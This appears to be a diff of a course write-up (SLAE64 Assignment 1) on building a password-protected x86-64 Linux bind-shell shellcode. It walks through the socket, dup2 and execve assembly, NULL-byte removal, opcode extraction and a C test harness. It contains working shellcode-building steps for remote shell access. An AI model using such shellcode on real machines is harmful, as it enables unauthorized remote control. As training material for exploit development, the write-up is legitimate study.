@@ -11,7 +11,7 @@ Requirements for this assignment are to create a Shell_Bind_TCP shellcode that:
   3. If the password is correct, then Exec Shell is executed 
   4. Also, the NULL bytes (0x00) must be removed from the shellcode 
 
-To build the shellcode use of the linux sockets is needed. Reading documentation, the following steps are required: 
+To build the shellcode have to use linux sockets. Then, for the assignment, the following steps have to be done:
 
   1. Create a socket 
   2. Bind the socket to a port 
@@ -27,11 +27,9 @@ For Linux Sockets Programming, the following System calls are required on this a
 
 ```c
 int socket(int domain, int type, int protocol); 
-int bind(int sockfd, const struct sockaddr *addr, 
-         socklen_t addrlen); 
+int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 
 int listen(int sockfd, int backlog); 
-int accept(int sockfd, struct sockaddr *addr, 
-           socklen_t *addrlen); 
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 
 int close(int sockfd); 
 ```
 To duplicate the standard input, output and error, `dup2()` call will be used: 
@@ -40,12 +38,10 @@ To duplicate the standard input, output and error, `dup2()` call will be used:
 int dup2(int oldfd, int newfd); 
 ```
 
-And to execute `/bin/sh`, will use the `execve()` call: 
+And to execute `/bin/sh`, `execve()` call will be used: 
 
 ```c
-int execve(const char *filename, 
-           char *const argv[], 
-           char *const envp[]); 
+int execve(const char *filename, char *const argv[], char *const envp[]); 
 ```
 ### ASM Implementation
 ----
@@ -65,14 +61,14 @@ syscall
 mov rdi, rax                ; value returned in RAX by syscall  
 ```
 This is the first step required for sockets, open the socket. 
-To execute the sys_socket system call the arguments will have to be placed in the corresponding registers: 
+To execute the `sys_socket` call, the arguments will have to be placed in the corresponding registers: 
 
-  - RAX <- 41 : Syscall number. 
-  - RDI <- 2 : Domain parameter. AF_INET is for IPv4. 
-  - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
-  - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
+  - **RAX** <- 41 : Syscall number. 
+  - **RDI** <- 2 : Domain parameter. AF_INET is for IPv4. 
+  - **RSI** <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
+  - **RDX** <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
 
-The syscall will return a file descriptor in RAX that is saved into RDI. This saves the socket_id for later use in the code
+The syscall will return a file descriptor in **RAX**, that is saved into **RDI**. This saves the socket_id for later use in the code
 
 #### Bind the Created Socket to a Port
 
@@ -100,10 +96,10 @@ This part irequires two steps:
     - Values are placed on the stack
     - Stack Pointer (RSP) is updated with the new address
   - Call the `bind` syscall. Values for parameters are placed into the registers:
-    - RAX: Syscall number (49)
-    - RDI: Socket descriptor. Already has the value from previous point
-    - RSI: Address of the struct. This value is in RSP
-    - RDX: The lengh of the sockaddr struct. It's 16 bytes
+    - **RAX**: Syscall number (49)
+    - **RDI**: Socket descriptor. Already has the value from previous point
+    - **RSI**: Address of the struct. This value is in RSP
+    - **RDX**: The lengh of the sockaddr struct. It's 16 bytes
 
 #### Listen for Incoming Connections
 
@@ -115,9 +111,9 @@ mov rsi, 2
 syscall 
 ```
 Values in the registers for the `listen` call parameters are:
-  - RAX <- 50 : Syscall Number 
-  - RDI : Already stores the socket descriptor 
-  - RSI <- 2 : Is the backlog parameter 
+  - **RAX** <- 50 : Syscall Number 
+  - **RDI** : Already stores the socket descriptor 
+  - **RSI** <- 2 : Is the backlog parameter 
 
 #### Accept Incoming Connections
 
@@ -143,17 +139,17 @@ syscall
 ; Store the client socket descripion returned by accept 
 mov rbx, rax                 ; r9 <- client_sock 
 ```
-`accept()`requires the following parameters:
+`accept()` requires the following parameters:
 
 - Socket descriptor, that's already stored in RDI
 - Address of the struct by reference. Stack is used to store this struct reserving 16 bytes in stack. The data of this struct will be modified by the syscall and will access throught RSP register
 - Address where the length of the struct is stored. This value is stored in the stack. RSP has this value
 
 Registers get this values for the parametrers:
-- RAX <- 43 : Syscall Number 
-- RDI : Already stores the socket descriptor 
-- RSI <- RSP : Address of stack where struct is 
-- RDX <- RSP+1 : Address of stack where the length of the struct is. Just one position more tan the struct itself 
+- **RAX** <- 43 : Syscall Number 
+- **RDI** : Already stores the socket descriptor 
+- **RSI** <- **RSP** : Address of stack where struct is 
+- **RDX** <- **RSP + 1** : Address of stack where the length of the struct is. Just one position more tan the struct itself 
 
 This call returns a socket descriptor for the client, that is stored in R9 for future use.
 
@@ -164,7 +160,7 @@ This call returns a socket descriptor for the client, that is stored in R9 for f
 mov rax, 3                  ; syscall number
 syscall
 ```
-This is the easiest part. Simply the "3" value is put into RAX for the syscall number of `close()`, and RDI already has the value of the socket descriptor to close.
+This is the easiest part. The "3" value is put into **RAX** for the syscall number for `close()`, and **RDI** already has the value of the socket descriptor to close.
 
 #### Duplicate Socket Descriptors
 
@@ -181,15 +177,15 @@ mov rax, 33
 mov rsi, 2
 syscall
 ```
-Using `dup2()`, `stdin`, `stdout`, and `stderr` are duplicated to the socket descriptor. One call to `dup2()` for each.
+Using `dup2()`, to duplicate in the socket descriptor `stdin`, `stdout`, and `stderr`. One call to `dup2()` for each.
 Registers get the following values for the parameters:
--	RAX <- 33 : Syscall number
--	RDI <- new file descriptor : Is the client socket id
--	RSI <- old file descriptor : Will be one call for STDIN, STDOUT, STDERR.
+-	**RAX** <- 33 : Syscall number
+-	**RDI** <- new file descriptor : Is the client socket id
+-	**RSI** <- old file descriptor : Will be one call for `stdin`, `stdout`, and `stderr`.
 
 #### Password Stuff
 
-First thing done in this part of the code, is to show the `"Passwd: "` prompt when connection established. This is done using the `write()`syscall to print the string stored in PASSWD_PROMPT. Access to the PASWD_PROMPT is done using Relative Addressing:
+First thing done in this part of the code, is to show the `"Passwd: "` prompt when connection established. This is done using the `write()` syscall, to print the string stored in **PASSWD_PROMPT**. Access to the **PASWD_PROMPT** is done using Relative Addressing:
 
 ```asm
 write_syscall:
@@ -200,7 +196,7 @@ write_syscall:
         syscall
 ```
 
-The password input is then stored in the PASSWD_INPUT string. Access to it is also done using Relative Addressing:
+The password input is then stored in the **PASSWD_INPUT** string. Access to it is also done using Relative Addressing:
 
 ```asm
 read_syscall:
@@ -211,7 +207,7 @@ read_syscall:
         syscall
 ```
 
-The last part of this section, is to compare the typed password from the user with the defined password. Password is defined as "12345678", and is hard coded into the RAX register (in case another password is desireed, value can be changed). RDI gets the address of the PASSWD_INPUT string via Relative Addressing. Comparison is done using the `scasq`instructio: if the two values does not match, program `jmp` to end, and if the password match, go to execute next section, the shell:
+The last part of this section, is to compare the typed password from the user with the defined password. Password is defined as `"12345678"`, and is hard coded into the **RAX** register (in case another password is desireed, value can be changed). **RDI** gets the address of the **PASSWD_INPUT** string via Relative Addressing. Comparison is done using the `scasq` instruction: if the two values does not match, program `jmp` to end, and if the password match, go to execute next section, the shell:
 
  ```asm
  compare_passwords:
@@ -224,7 +220,7 @@ The last part of this section, is to compare the typed password from the user wi
 
 #### The Shell: Execve
 
-Code used is the standard from Execve-Stack. In this code, the `/bin//sh` string parameter and the length of the string are stored in the Stack and accessed via the Stack Technique:
+Code used is the standard from Execve-Stack. In this code, the `/bin//sh` string parameter and the length of the string, are stored in the Stack and accessed via the Stack Technique:
 
 ```asm
 execve_syscall:
@@ -261,15 +257,15 @@ The code for this first version of the Bind Shell, can be found in the [BindShel
 
 Let's try the code compiling and linking it. Commands are:
 
-```markdown
+```bash
 SLAE64> nasm -f elf64 BindShell-ExecveStack.nasm -o BindShell-ExecveStack.o
 SLAE64> ld -N BindShell-ExecveStack.o -o BindShell-ExecveStack
 ```
 <img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Compile.png" width="75%" height="75%">
 
-> The **-N** option in the linker is needed, as the code access to memory positions in the `.text` section (code) instead `.data` section.
+> The **-N** option in the linker is needed to execute the code, as the code access to memory positions in the `.text` section (code) instead `.data` section.
 
-Time to test. Program is executed and using `netcat` a conection is made. The `"Passwd: "` prompt appears asking for the password:
+Time to test. Program is executed, and using `netcat`, a conection is made. The `"Passwd: "` prompt appears asking for the password:
 
 <img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Exec01.png" width="75%" height="75%">
 
@@ -284,11 +280,11 @@ If the password is incorrect, program will exit with a Segmentation Fault:
 ### Remove NULLs and Reduce Shellcode Size
 ---
 
-> The final ASM code after the changes explained here can be found at the [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/Assignment01/BindShell-Execve-Stack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
+> The final ASM code after the changes explained in this section, can be found at the [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/Assignment01/BindShell-Execve-Stack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
 
-The actual shellcode has several NULLs and a size of 274 bytes (too much!). With `objdump` we can get the opcodes and review the NULLs in the shellcode:
+The actual shellcode has several NULLs and a size of 274 bytes (too much!). Using `objdump` will get the opcodes and review the NULLs in the shellcode:
 
-```markdown
+```bash
 SLAE> objdump -M intel -d BindShell-ExecveStack.o
 
 BindShell-ExecveStack.o:     formato del fichero elf64-x86-64
@@ -317,14 +313,14 @@ Desensamblado de la sección .text:
 [...]
 ```
 
-`objdump`dump shows instructions that use NULLs. First step is removing the NULLs replacing instructions that put 0x00 in the shellcode by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
+`objdump` shows instructions that use NULLs. First step is removing the NULLs, replacing instructions that put `0x00` in the shellcode, by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
 
 - `mov rax, VALUE` is replaced by `push VALUE; pop rax`
 - `mov [rsp], VALUE` is replaced by `push VALUE`
 - Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
-- Using CDQ instruction to ZEROing RDX. It puts RDX to 0x00 if RAX >= 0
+- Using `cdq` instruction to ZEROing **RDX**. It puts **RDX** to `0x00` if **RAX** >= 0
 
-Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode. Being carefull on which instructions are used, the size of the shellcode just removing the NULLs, is reduced to 172 bytes. 
+Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode. Being carefull on which instructions are used, the size of the shellcode, only removing NULLs, is reduced to 172 bytes. 
 
 To get the final shellcode in the desireed format, the following `bash` one liner command using `objdump` is used:
 ```bash
@@ -344,7 +340,7 @@ SLAE64> echo “\"$(objdump -d 0_BindShell-ExecveStack.o | grep '[0-9a-f]:' |
 SLAE64> 
 ```
 
-But still the shellcode size can be reduced. V1 code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode that uses 7 bytes. For this the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. The new code for the Password Stuff section after appliying changes is:
+But still the shellcode size can be reduced. V1 code is using Relative Addressing for the Password Stuff. This technique, forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode size of 7 bytes. For this reason, the Stack Technique is going to be used for the Password Stuff to replace Relative Addressing. The new code for the Password Stuff section after appliying changes is:
 ```asm
 write_syscall:
 
@@ -391,7 +387,7 @@ compare_passwords:
 ```
 Also, the code for the `close()` can be removed, as the socket descriptor is not used anymore once the `accept()` get a connection. 
 
-**_UPDATE_** Now let's use a trick learned from [Assignment05-1](Assignment05_1). For the `accept()` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the sockaddr struct, and this is not a problem as this data is not used in the code, just use the returned sock descriptor in RAX. In `man 2 accept` this is explained. Then, the code for the `accept()` section ends like this:
+**_UPDATE_** Now let's use a trick learned from [Assignment05-1](Assignment05_1). For the `accept()` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the `sockaddr` struct. This is not a problem, as this data is not used in the code. From this syscall is needed the socked descriptor returned in **RAX**. In `man 2 accept` this is explained. Then, the code for the `accept()` section ends like this:
 ```asm
 ; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
         ;       RDI already has the sock_id
@@ -428,22 +424,7 @@ But won't do it, as the reached size for the shellcode is good enought with **on
 
 ### Executing Final Shellcode
 ---
-To test the shellcode, the `shellcode.c` template is used:
-```c
-#include <stdio.h>
-#include <string.h>
-
-unsigned char code[]= \
-"";
-
-void main()
-{
-        printf("ShellCode Lenght: %d\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
-}
-```
-To use it, the generated shellcode has to be placed in the `unsigned char code[]` string:
+To test the shellcode, the `shellcode.c` template is used. To use it, the generated shellcode has to be placed in the `unsigned char code[]` string:
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -466,10 +447,10 @@ void main()
 }
 ```
 Now the code can be compiled with `gcc` using the `-fno-stack-protector` and `-z execstack` options:
-```markdown
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
-The shellcode can be executed, and using `netcat`, a connection is opened to the victim:
+The shellcode now can be executed, and using `netcat`, a connection is opened to the victim:
 
 <img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_V2_Exec01.png" width="75%" height="75%">
 
